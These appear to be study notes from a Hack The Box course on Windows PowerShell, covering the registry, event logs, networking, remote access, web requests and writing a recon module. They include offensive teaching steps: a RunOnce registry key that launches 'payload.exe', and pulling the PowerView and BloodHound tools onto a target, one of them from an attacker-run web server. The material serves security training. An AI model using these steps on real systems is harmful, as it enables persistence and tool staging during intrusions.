				- `New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey`
				- By specifying the `-Path` parameter, we avoid changing our location in the shell to where we want to add a key in the Registry, letting us work from anywhere as long as we specify the absolute path.
				- Set a Property and a value now:
				- `New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"`
				- ![[Pasted image 20231113095508.png]]
				- If we wanted to add the same key/value pair using Reg.exe, we would do so like this:
					- `reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"`
	- **Delete Reg properties**
		- `Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"`
		- `Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey`
			- If no error window popped up, our key/value pair was deleted successfully. However, this is one of those things you should be extremely careful with. Removing entries from the Windows Registry could negatively affect the host and how it functions.
- ## Working with the Windows Event Log (PowerShell)
	- **What is the Windows Event Log?**
		- An `event` is any action or occurrence that can be identified and classified by a system's hardware or software. `Events` can be generated or triggered through a variety of different ways including some of the following:
			- **User-Generated Events**
			    - Movement of a mouse, typing on a keyboard, other user-controlled peripherals, etc.
			- **Application Generated Events**
			    - Application updates, crashes, memory usage/consumption, etc.
			- **System Generated Events**
			    - System uptime, system updates, driver loading/unloading, user login, etc.
		- **Event Logging** provides a standard, centralized way for applications (and the operating system) to record important software and hardware events.
		- `Windows Event Log` manages events and event logs, however, in addition to this functionality it also opens up a special API that allows applications to maintain and manage their own separate logs. The Event Log is a required Windows service starting upon system initialization that runs in the context of another executable and not it's own.
	- **Event Log Categories and Types**
		- **Categories**:
			- **System Log** - The system log contains events related to the Windows system and its components. A system-level event could be a service failing at startup.
			- **Security Log** - Self-explanatory; these include security-related events such as failed and successful logins, and file creation/deletion. These can be used to detect various types of attacks that we will cover in later modules.
			- **Application Log** - This stores events related to any software/application installed on the system. For example, if Slack has trouble starting it will be recorded in this log.
			- **Setup Log** - This log holds any events that are generated when the Windows operating system is installed. In a domain environment, events related to Active Directory will be recorded in this log on domain controller hosts.
			- **Forwarded Events** - Logs that are forwarded from other hosts within the same network.
		- **Types**:
			- **Error** - Indicates a major problem, such as a service failing to load during startup, has occurred.
			- **Warning** - A less significant log but one that may indicate a possible problem in the future. One example is low disk space. A Warning event will be logged to note that a problem may occur down the road. A Warning event is typically when an application can recover from the event without losing functionality or data.
			- **Information** - Recorded upon the successful operation of an application, driver, or service, such as when a network driver loads successfully. Typically not every desktop application will log an event each them they start, as this could lead to a considerable amount of extra "noise" in the logs.
			- **Success Audit** - Recorded when an audited security access attempt is successful, such as when a user logs on to a system.
			- **Failure Audit** - Recorded when an audited security access attempt fails, such as when a user attempts to log in but types their password in wrong. Many audit failure events could indicate an attack, such as Password Spraying.
		- **Event Severity Levels**
			- **Verbose (5)** - Progress or success messages.
			- **Information (4)** - An event that occurred on the system but did not cause any issues.
			- **Warning (3)** - A potential problem that a sysadmin should dig into.
			- **Error (2)** - An issue related to the system or service that does not require immediate attention.
			- **Critical (1)** - This indicates a significant issue related to an application or a system that requires urgent attention by a sysadmin that, if not addressed, could lead to system or application instability.
	- Elements of a Windows Event Log:
		- Log name
		- Event date/time
		- Task Category
		- Event ID
		- Source
		- Level
		- User
		- Computer
	- In an Active Directory environment, [this list](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor) includes key events that are recommended to be monitored for to look for signs of a compromise. [This](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/) searchable database of Event IDs is worth perusing to understand the depth of logging possible on a Windows system.
	- On a Windows system, the service's display name is `Windows Event Log`, and it runs inside the service host process [svchost.exe](https://en.wikipedia.org/wiki/Svchost.exe).
		- By default, Windows Event Logs are stored in `C:\Windows\System32\winevt\logs` with the file extension `.evtx`.
	- We can interact with the Windows Event log using the [Windows Event Viewer](https://en.wikipedia.org/wiki/Event_Viewer) GUI application via the command line utility [wevtutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil), or using the [Get-WinEvent](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3) PowerShell cmdlet. Both `wevtutil` and `Get-WinEvent` can be used to query Event Logs on both local and remote Windows systems via cmd.exe or PowerShell.
		- **Using wevtutil**
			- `wevtutil /?`
			- `wevtutil el`
				- `el` parameter enumerates the names of all logs present on a Windows system (Enumerate Log)
			- `wevtutil gl "Windows PowerShell"`
				- `gl` parameter displays configuration information of a specific log (Gather Log)
			- `wevtutil gli "Windows PowerShell"`
				- `gli` parameter gives specific status information about the log or log file (Gather Log Information)
			- `wevutil qe Security /c:5 /rd:true /f:text`
				- `qe` queries events, displays the last 5 most recent events from the Security log in text format.
			- `wevtutil epl System C:\system_export.evtx`
				- `eql` exports events from System log to C:\system_export.evtx
		- **Using Get-WinEvent**
			- `Get-WinEvent -ListLog *`
				-  list all logs on the computer
			- `Get-WinEvent -ListLog Security`
				- list all Security logs on the computer
			- `Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message`
				- Query for the last X number of events, looking specifically for the last five events using the `-MaxEvents` parameter. By default, the newest logs are listed first. If we want to get older logs first, we can reverse the order to list the oldest ones first using the `-Oldest` parameter.
			- `Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}`
				- Look at logon failures in the Security log, checking for Event ID [4625: An account failed to log on](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625). From here, we could use the `-ExpandProperty` parameter to dig deeper into specific events, list logs from oldest to newest, etc.
			- `Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message`
				- Look at only events with a specific information level. Check all System logs for only `critical` events with information level `1`.
- ## Networking Management from The CLI (PowerShell)
	- ***Scenario**: To ensure Mr. Tanaka's host is functioning properly and we can manage it from the IT office remotely, we are going to perform a quick checkup, validate his host settings, and enable remote management for the host.*
	- Network Protocols:
		- `SMB`[SMB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/4287490c-602c-41c0-a23e-140a1f137832) provides Windows hosts with the capability to share resources, files, and a standard way of authenticating between hosts to determine if access to resources is allowed. For other distros, SAMBA is the open-source option.
		- `Netbios`[NetBios](https://www.ietf.org/rfc/rfc1001.txt) itself isn't directly a service or protocol but a connection and conversation mechanism widely used in networks. It was the original transport mechanism for SMB, but that has since changed. Now it serves as an alternate identification mechanism when DNS fails. Can also be known as NBT-NS (NetBIOS name service).
		- `LDAP`[LDAP](https://www.rfc-editor.org/rfc/rfc4511) is an `open-source` cross-platform protocol used for `authentication` and `authorization` with various directory services. This is how many different devices in modern networks can communicate with large directory structure services such as `Active Directory`.
		- `LLMNR`[LLMNR](https://www.rfc-editor.org/rfc/rfc4795) provides a name resolution service based on DNS and works if DNS is not available or functioning. This protocol is a multicast protocol and, as such, works only on local links ( within a normal broadcast domain, not across layer three links).
		- `DNS`[DNS](https://datatracker.ietf.org/doc/html/rfc1034) is a common naming standard used across the Internet and in most modern network types. DNS allows us to reference hosts by a unique name instead of their IP address. This is how we can reference a website by "WWW.google.com" instead of "8.8.8.8". Internally this is how we request resources and access from a network.
		- `HTTP/HTTPS`[HTTP/S](https://www.rfc-editor.org/rfc/rfc2818) HTTP and HTTPS are the insecure and secure way we request and utilize resources over the Internet. These protocols are used to access and utilize resources such as web servers, send and receive data from remote sources, and much more.
		- `Kerberos`[Kerberos](https://web.mit.edu/kerberos/) is a network level authentication protocol. In modern times, we are most likely to see it when dealing with Active Directory authentication when clients request tickets for authorization to use domain resources.
		- `WinRM`[WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) Is an implementation of the WS-Management protocol. It can be used to manage the hardware and software functionalities of hosts. It is mainly used in IT administration but can also be used for host enumeration and as a scripting engine.
		- `RDP`[RDP](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/rds-plan-access-from-anywhere) is a Windows implementation of a network UI services protocol that provides users with a Graphical interface to access hosts over a network connection. This allows for full UI use to include the passing of keyboard and mouse input to the remote host.
		- `SSH`[SSH](https://datatracker.ietf.org/doc/html/rfc4251) is a secure protocol that can be used for secure host access, transfer of files, and general communication between network hosts. It provides a way to securely access hosts and services over insecure networks.
	- Local vs. Remote access
		- Local is directly at the terminal, remote is away from the terminal accessing it
		- **Querying Networking Settings**
			- `ipconfig`
			- `ipconfig /all`
				- We have as output the IPv4/6 addresses, our gateway, subnet masks, and DNS suffix if one is set. We can output the full network settings by appending the `/all` modifier to the ipconfig command
			- `arp -a` 
				- ARP is a protocol utilized to `translate IP addresses to Physical addresses`. The physical address is used at lower levels of the `OSI/TCP-IP` models for communication. To have it display the host's current ARP entries, we will use the `-a` switch.
			- `nslookup ACADEMY-ICL-DC`
				- `nslookup`, a built-in DNS querying tool, to attempt to resolve the IP address / DNS name of the Greenhorn domain controller.
			* `netstat -an`
				* Using `netstat -an`. Netstat will display current network connections to our host. The `-an` switch will print all connections and listening ports and place them in numerical form.
		* **PowerShell Net Cmdlets**
			* `Get-NetIPInterface` - Retrieve all `visible` network adapter `properties`.
			* `Get-NetIPAddress` - Retrieves the `IP configurations` of each adapter. Similar to `IPConfig`.
				* `Get-NetIPAddress -ifIndex 25`
					* Gets the Adapter information for our Wi-Fi connection at `ifIndex 25` utilizing the [Get-NetIPAddress](https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netipaddress?view=windowsserver2022-ps) cmdlet.
			* `Get-NetNeighbor` - Retrieves the `neighbor entries` from the cache. Similar to `arp -a`.
			* `Get-Netroute` - Will print the current `route table`. Similar to `IPRoute`.
			* `Set-NetAdapter` - Set basic adapter properties at the `Layer-2` level such as VLAN id, description, and MAC-Address.
			* `Set-NetIPInterface` - Modifies the `settings` of an `interface` to include DHCP status, MTU, and other metrics.
				* `Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled`
					* Disables the DHCP property with the Set-NetIPInterface cmdlet for Index 25
			* `New-NetIPAddress` - Creates and configures an `IP address`.
			* `Set-NetIPAddress` - Modifies the `configuration` of a network adapter.
				* `Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24`
					* sets our manual IP address
				* `Get-NetIPAddress -ifindex 20 | ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength`
					* Command now sets our IP address to `10.10.100.54` and the PrefixLength ( also known as the subnet mask ) to `24`. Looking at our checks, we can see that those settings are in place
			* `Disable-NetAdapter` - Used to `disable` network adapter interfaces.
			* `Enable-NetAdapter` - Used to turn network adapters back on and `allow` network connections.
			* `Restart-NetAdapter` - Used to restart an adapter. It can be useful to help push `changes` made to adapter `settings`.
				* `Restart-NetAdapter -Name 'Ethernet 3'`
					* test our connection to see if it sticks
			* `test-NetConnection` - Allows for `diagnostic` checks to be ran on a connection. It supports ping, tcp, route tracing, and more.
				* `Test-NetConnection`
					* a powerful cmdlet and can test more than just if we can reach another host and have network connectivity. It can tell us about our TCP results, detailed metrics, route diagnostics and more ([Test-NetConnection](https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps)). 
		* **How to Enable Remote Access?**
			* SSH, PSSessions, etc.
			* **Setting up SSH on a Windows Target**
				* `Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'`
				* `Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0`
				* `Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'`
				* `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0`
				* `Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'`
			* **Starting the SSH Service & Setting Startup Type**
				* `Start-Service sshd`
				* `Set-Service -Name sshd -StartupType 'Automatic'`
			* **Accessing PowerShell over SSH**
				* Connecting from Windows
					* `ssh htb-student@10.129.224.248`
					* `powershell`
				* Connecting from Linux
					* `ssh htb-student@10.129.224.248`
					* `powershell`
	* **Enabling WinRM**
		* [Windows Remote Management (WinRM)](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) can be configured using dedicated PowerShell cmdlets and we can enter into a PowerShell interactive session as well as issue commands on remote Windows target(s). We will notice that WinRM is more commonly enabled on Windows Server operating systems, so IT admins can perform tasks on one or multiple hosts. It's enabled by default in Windows Server.
		* Because of the increasing demand for the ability to remotely manage and automate tasks on Windows systems, we will likely see WinRM enabled on more & more Windows desktop operating systems (Windows 10 & Windows 11) as well. **When WinRM is enabled on a Windows target, it listens on logical ports `5985` & `5986`.**
			* **Enabling & Configuring WinRM**
				* `winrm quickconfig`
					* automatically ensure all the necessary configurations are in place to:
						- Enable the WinRM service
						- Allow WinRM through the Windows Defender Firewall (Inbound and Outbound)
						- Grant administrative rights remotely to local users
					- further steps to harden these WinRM configurations:
						- Configure TrustedHosts to include just IP addresses/hostnames that will be used for remote management
						- Configure HTTPS for transport
						- Join Windows systems to an Active Directory Domain Environment and Enforce Kerberos Authentication
			- **Testing PowerShell Remote Access**
				- Unauthenticated Access
					- `Test-WSMan -ComputerName "10.129.224.248"`
						- Running this cmdlet sends a request that checks if the WinRM service is running. Keep in mind that this is unauthenticated, so no credentials are used, which is why no `OS` version is detected. This shows us that the WinRM service is running on the target.
				- Authenticated Access
					- `Test-WSMan -ComputerName "10.129.224.248" -Authentication Negotiate`
						- We can run the same command with the option `-Authentication Negotiate` to test if WinRM is authenticated, and we will receive the OS version (`10.0.11764`).
				- **Establishing a PowerShell Session from Windows**
					- `Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate`
				- **Establishing a PowerShell Session from Linux**
					- `Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate`
- ## Interacting With The Web (PowerShell)
	- **How Do We Interact With The Web Using PowerShell?**
		- When it comes to interacting with the web via PowerShell, the [Invoke-WebRequest](https://learn.microsoft.com/bs-latn-ba/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1) cmdlet is our champion. The Invoke-WebRequest cmdlet is aliased to `wget`, `iwr` and `curl`. We can use it to: 
			- perform basic HTTP/HTTPS requests (like `GET` and `POST`)
			- parse through HTML pages
			- download files
			- authenticate
			- maintain a session with a site
		- `Get-Help Invoke-Webrequest`
		- **A Simple Web Request**
			- **Get Request with Invoke-WebRequest**
				- `Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member`
				- Notice all the different properties this site has. We can now filter on those if we wish to show only a portion of the site.
			- **Filtering Incoming Content**
				- `Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images`
				- Now we have an easy-to-read list of the images included in the website, and we can download them if we want. This is a super easy way only to get the information we wish to see.
			- **Raw Content**
				- `Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent`
		- **Downloading Files using PowerShell**
			- **Downloading PowerView.ps1 from GitHub**
				- `Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"`
				- Downloads a powerful tool used by Penetration Testers
			- **Example Path to Bring Tools Into an Environment**
				- If we already had PowerView.ps1 stored on our `attack host` we could use a simple Python web server to host PowerView.ps1 and download it from the target. From the attack host, we want to confirm that the file is already present or we need to download it. In this example, we can assume it is already on the attack host for demonstration purposes:
					- **Using ls to View the File (Attack Host)**
						- `ls`
					- **Starting the Python Web Server (Attack Host)**
						- `python3 -m http.server 8000`
					- **Downloading PowerView.ps1 from Web Server (From Attack Host to Target Host)**
						- `Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"`
	- So what happens if we are restricted from using `Invoke-WebRequest` for some reason?
		- Windows provides several different methods to interact with web clients:
			- [.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0) class - This handy class is a .Net call we can utilize as Windows uses and understands .Net. This class contains standard system.net methods for interacting with resources via a URI (web addresses like github.com/project/tool.ps1).
				- **Net.WebClient Download**
					- `(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")`
						- First we have the Download cradle `(New-Object Net.WebClient).DownloadFile()`, which is how we tell it to execute our request.
						- Next, we need to include the URI of the file we want to download as the first parameter in the `()`. For this example, that was "https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip".
						- Finally, we need to tell the command where we want the file written to with the second parameter, "BloodHound.zip".
					- The command above would have downloaded the file to the current directory we are working from as `Bloodhound.zip`
					- Keep in mind this is noisy because you will have web requests entering and leaving your network along with file reads and writes, so it **WILL** leave logs.
- ## PowerShell Scripting and Automation (PowerShell)
	- We can utilize singular scripts in the usual manner by calling them utilizing `.\script` syntax and importing modules using the `Import-Module` cmdlet
	- **Scripts vs. Modules**
		- A script is an executable text file containing PowerShell cmdlets and functions.
		- A module can be just a simple script, or a collection of multiple script files, manifests, and functions bundled together.
		- The other main difference is in their use. You would typically call a script by executing it directly, while you can import a module and all of the associated scripts and functions to call at your whim. F
	- **PowerShell Extensions**
		- **ps1** - The `*.ps1` file extension represents executable PowerShell scripts.
		- **psm1** - The `*.psm1` file extension represents a PowerShell module file. It defines what the module is and what is contained within it.
		- **psd1** - The `*.psd1` is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs.
	- **Making a Module**
		- ***Scenario**: We have found ourselves performing the same checks over and over when administering hosts. So to expedite our tasks, we will create a PowerShell module to run the checks for us and then output the information we ask for. Our module, when used, should output the host's `computer name`, `IP address`, and basic `domain information`, and provide us with the output of the `C:\Users\` directory so we can see what users have interactively logged into that host.*
		- **Module Components**
			- A module is made up of `four` essential components:
				1. A `directory` containing all the required files and content, saved somewhere within `$env:PSModulePath`.
				- This is done so that when you attempt to import it into your PowerShell session or Profile, it can be automatically found instead of having to specify where it is.
				2. A `manifest` file listing all files and pertinent information about the module and its function.
				- This could include associated scripts, dependencies, the author, example usage, etc.
				3. Some code file - usually either a PowerShell script (`.ps1`) or a (`.psm1`) module file that contains our script functions and other information.
				4. Other resources the module needs, such as help files, scripts, and other supporting documents.
		* **Making a Directory to Hold Our Module**
			* This directory should be in one of the paths within `$env:PSModulePath`
			* `mkdir quick-recon`
		* **Module Manifest**
			* A simple `.psd1` file that contains a hash table. The keys and values in the hash table perform the following functions:
				- Describe the `contents` and `attributes` of the module.
				- Define the `prerequisites`. ( specific modules from outside the module itself, variables, functions, etc.)
				- Determine how the `components` are `processed`.
			* If you add a manifest file to the module folder, you can reference multiple files as a single unit by referencing the manifest. The `manifest` describes the following information:
				- `Metadata` about the module, such as the module version number, the author, and the description.
				- `Prerequisites` needed to import the module, such as the Windows PowerShell version, the common language runtime (CLR) version, and the required modules.
				- `Processing` directives, such as the scripts, formats, and types to process.
				- `Restrictions` on the module members to export, such as the aliases, functions, variables, and cmdlets to export.
			- `New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru`
				- By issuing the command above, we have provisioned a `new` manifest file populated with the default considerations. The `-PassThru` modifier lets us see what is being printed in the file and on the console. We can now go in and fill in the sections we want with the relevant info. Remember that all the lines in the manifest files are optional except for the `ModuleVersion` line. Editing the manifest will be easiest done from a GUI where you can utilize a text editor or IDE such as VSCode. 
			- If we were to complete our manifest file now for this module, it would appear something like this:
				- ```# Module manifest for module 'quick-recon'
				#
				# Generated by: MTanaka
				#
				# Generated on: 10/31/2022
				#
				
				@{
				
				# Script module or binary module file associated with this manifest.
				# RootModule = 'C:\Users\MTanaka\WindowsPowerShell\Modules\quick-recon\quick-recon.psm1'
				
				# Version number of this module.
				ModuleVersion = '1.0'
				
				# ID used to uniquely identify this module
				GUID = '0a062bb1-8a1b-4bdb-86ed-5adbe1071d2f'
				
				# Author of this module
				Author = 'MTanaka'
				
				# Company or vendor of this module
				CompanyName = 'Greenhorn.Corp.'
				
				# Copyright statement for this module
				Copyright = '(c) 2022 Greenhorn.Corp. All rights reserved.'
				
				# Description of the functionality provided by this module
				Description = 'This module will perform several quick checks against the host for Reconnaissance of key information.'
				
				# Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.
				FunctionsToExport = @()
				
				# Cmdlets to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no cmdlets to export.
				CmdletsToExport = @()
				
				# Variables to export from this module
				VariablesToExport = '*'
				
				# Aliases to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no aliases to export.
				AliasesToExport = @()
				
				# List of all modules packaged with this module
				# ModuleList = @()
				
				# List of all files packaged with this module
				# FileList = @()  
				}```
	* **Create Our Script File**
		* `ni quick-recon.psm1 -ItemType File`
			* creates file using the New-Item cmdlet
	* **Import Into Our Module**
		* Add an import line for the `ActiveDirectory` module
			* `Import-Module ActiveDirectory`
		* Now we have our module script file quick-recon.psm1, and we have added an import-module statement within. Now we can get to the meat of the file, our functions.
	* **Functions and doing work with PowerShell**
		* We need to do four main things with this module:
			- Retrieve the host ComputerName
			- Retrieve the hosts IP configuration
			- Retrieve basic domain information
			- Retrieve an output of the "C:\Users" directory
		* To get started, let's focus on the ComputerName output. We can get this many ways with various cmdlets, modules, and DOS commands. Our script will utilize the environment variable (`$env:ComputerName`) to acquire the hostname for the output.
		* To make our output easier to read later, we will use another variable named `$hostname` to store the output from the environment variable.
		* To capture the IP address for the active host adapters, we will use `IPConfig` and store that info in the variable `$IP`.
		* For Basic domain information, we will use `Get-ADDomain` and store the output into `$Domain`.
		* Lastly, we will grab a listing of the user folders in C:\Users\ with `Get-ChildItem` and store it in `$Users`.
			* To create our variables, we must first specify a name like (`$Hostname`), append the "=" symbol, and then follow it with the action or values we want it to hold. For example, the first variable we need, `$Hostname`, would appear like so: (`$Hostname = $env:ComputerName`). Now let's dive in and create the rest of our variables for use.
			* **Variables**
				* ```Import-Module ActiveDirectory 

				$Hostname = $env:ComputerName
				$IP = ipconfig 
				$Domain = Get-ADDomain  
				$Users = Get-ChildItem C:\Users\ ```
		*  Now let's format that data and give ourselves some nice output. We can do this by writing the result to a `file` using `New-Item` and `Add-Content`. To make things easier, we will make this output process into a callable function called `Get-Recon`.
	* **Output Our Info**
		* ```Import-Module ActiveDirectory
		function Get-Recon {  
		    $Hostname = $env:ComputerName  
		    $IP = ipconfig
		    $Domain = Get-ADDomain 
		    $Users = Get-ChildItem C:\Users\
		    new-Item ~\Desktop\recon.txt -ItemType File 
		    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
		    Add-Content ~\Desktop\recon.txt $Vars
		  }```
		* `New-Item` creates our output file for us first, then notice how we utilized one more variable (`$Vars`) to format our output. We call each variable and insert a descriptive line in between each. Lastly, the `Add-Content` cmdlet appends the data we gather into a file called recon.txt by writing the results of $Vars. 
		* Next, we need to add some comments to our file so that others can understand what we are trying to accomplish and why we did it the way we did.
	* **Comments within the Script**
		* The (`#`) will tell PowerShell that the line contains a comment within your script or module file. If your comments are going to encompass several lines, you can use the `<#` and `#>` to wrap several lines as one large comment like seen below:
			* ```# This is a single-line comment.  
			<# This line and the following lines are all wrapped in the Comment specifier. 
			Nothing with this window will be ready by the script as part of a function.
			This text exists purely for the creator and us to convey pertinent information.
			#>```
		* Comments added:
			* ```Import-Module ActiveDirectory
			function Get-Recon {  
			    # Collect the hostname of our PC.
			    $Hostname = $env:ComputerName  
			    # Collect the IP configuration.
			    $IP = ipconfig
			    # Collect basic domain information.
			    $Domain = Get-ADDomain 
			    # Output the users who have logged in and built out a basic directory structure in "C:\Users\".
			    $Users = Get-ChildItem C:\Users\
			    # Create a new file to place our recon results in.
			    new-Item ~\Desktop\recon.txt -ItemType File 
			    # A variable to hold the results of our other variables. 
			    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
			    # It does the thing 
			    Add-Content ~\Desktop\recon.txt $Vars
			  } ```
		* Now we need to include a bit of `help` syntax so others can understand how to use our module.
	* **Including Help**
		* ```<# 
		.Description  
		This function performs some simple recon tasks for the user. We import the module and then issue the 'Get-Recon' command to retrieve our output. Each variable and line within the function and script are commented for your understanding. Right now, this only works on the local host from which you run it, and the output will be sent to a file named 'recon.txt' on the Desktop of the user who opened the shell. Remote Recon functions coming soon!  
		
		.Example  
		After importing the module run "Get-Recon"
		'Get-Recon
		
		
		    Directory: C:\Users\MTanaka\Desktop
		
		
		Mode                 LastWriteTime         Length Name
		----                 -------------         ------ ----
		-a----         11/3/2022  12:46 PM              0 recon.txt '
		
		.Notes  
		Remote Recon functions coming soon! This script serves as our initial introduction to writing functions and scripts and making PowerShell modules.  
		
		#>```
	* **Protecting Functions**
		* To protect a function from being exported or to explicitly set it for export, the `Export-ModuleMember` is the cmdlet for the job. The contents are exportable if we leave this out of our script modules. If we place it in the file but leave it blank like so:
			* `Export-ModuleMember`
			* It ensures that the module's variables, aliases, and functions cannot be `exported`. If we wish to specify what to export, we can add them to the command string like so:
			* `Export-ModuleMember -Function Get-Recon -Variable Hostname`
			* Alternatively, if you only wanted to export all functions and a specific variable, for example, you could issue the `*` after -Function and then specify the Variables to export explicitly. So let's add the `Export-ModuleMember` cmdlet to our script and specify that we want to allow our function `Get-Recon` and our variable `Hostname` to be available for export.
	* **Scope**
		* how PowerShell recognizes and protects objects within the session from unauthorized access or modification. PowerShell currently uses `three` different Scope levels:
			* **Global** - This is the default scope level for PowerShell. It affects all objects that exist when PowerShell starts, or a new session is opened. Any variables, aliases, functions, and anything you specify in your PowerShell profile will be created in the Global scope.
			* **Local** - This is the current scope you are operating in. This could be any of the default scopes or child scopes that are made.
			* **Script** - This is a temporary scope that applies to any scripts being run. It only applies to the script and its contents. Other scripts and anything outside of it will not know it exists. To the script, Its scope is the local scope.
	* **Final Product**
		* ```import-module ActiveDirectory
		
		<# 
		.Description  
		This function performs some simple recon tasks for the user. We import the module and then issue the 'Get-Recon' command to retrieve our output. Each variable and line within the function and script are commented for your understanding. Right now, this only works on the local host from which you run it, and the output will be sent to a file named 'recon.txt' on the Desktop of the user who opened the shell. Remote Recon functions coming soon!  
		
		.Example  
		After importing the module run "Get-Recon"
		'Get-Recon
		
		
		    Directory: C:\Users\MTanaka\Desktop
		
		
		Mode                 LastWriteTime         Length Name                                                                                                                                        
		----                 -------------         ------ ----                                                                                                                                        
		-a----         11/3/2022  12:46 PM              0 recon.txt '
		
		.Notes  
		Remote Recon functions coming soon! This script serves as our initial introduction to writing functions and scripts and making PowerShell modules.  
		
		#>
		function Get-Recon {  
		    # Collect the hostname of our PC
		    $Hostname = $env:ComputerName  
		    # Collect the IP configuration
		    $IP = ipconfig
		    # Collect basic domain information
		    $Domain = Get-ADDomain 
		    # Output the users who have logged in and built out a basic directory structure in "C:\Users"
		    $Users = Get-ChildItem C:\Users\
		    # Create a new file to place our recon results in
		    new-Item ~\Desktop\recon.txt -ItemType File 
		    # A variable to hold the results of our other variables 
		    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
		    # It does the thing 
		    Add-Content ~\Desktop\recon.txt $Vars
		  } 
		
		Export-ModuleMember -Function Get-Recon -Variable Hostname```
	* **Importing the Module For Use**
		* `Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1`
		* `get-module`
		* We can see that our module was imported using the `Import-Module` cmdlet, and to ensure it was loaded into our session, we ran the `Get-Module` cmdlet. It has shown us that our module `quick-recon` was imported and has the command `Get-Recon` that could be exported. 
		* `get-help get-recon`
- ## Beyond this Module
	- The [Beginner Track](https://app.hackthebox.com/tracks/Beginner-Track) on the main HTB platform is an excellent resource for practice.
		- **Boxes to Pwn**
			- [Blue](https://www.youtube.com/watch?v=YRsfX6DW10E&t=38s)
			- [Support](https://app.hackthebox.com/machines/Support)
			- [Return](https://0xdf.gitlab.io/2022/05/05/htb-return.html)
		- **Great Videos to Check Out**
			- [APT's Love PowerShell, You Should Too](https://youtu.be/GhfiNTsxqxA) from `DEFCON SafeMode` is an excellent watch for a dive into how adversaries utilize PowerShell for exploitation. Anthony and Jake do a great job of breaking down what defenses are bypassed and even show you a few tips and tricks you can utilize.
			- [PowerShell For Pentesting](https://youtu.be/jU1Pz641zjM) was presented at KringleCon 2018 by Mick Douglas provides an interesting look at how you can take basic PowerShell tasks and weaponize them for Pentesting.
			- [PowerShell & Under The Wire](https://youtu.be/864S16g_SQs) John Hammond goes over a cool platform called UnderTheWire, where you can practice your PowerShell Kung-Fu.
		- **Writers and Blogs To Follow**
			- [0xdf's walkthroughs](https://0xdf.gitlab.io/tags.html#active-directory). 
			- The list below contains links to other authors and blogs we feel do a great job discussing security topics, tool usage, and much more:
				- [Microsofts Training Documentation](https://docs.microsoft.com/en-us/training/modules/introduction-to-powershell/) is an interesting and great resource for those looking for a deeper dive into Powershell usage.
				- [Black Hills Information Security](https://www.blackhillsinfosec.com/?s=Powershell) writes quite a bit about PowerShell, Command Prompt usage, and exploitation, among other things. Their content is excellent, and they have a breadth of blog posts to absorb.
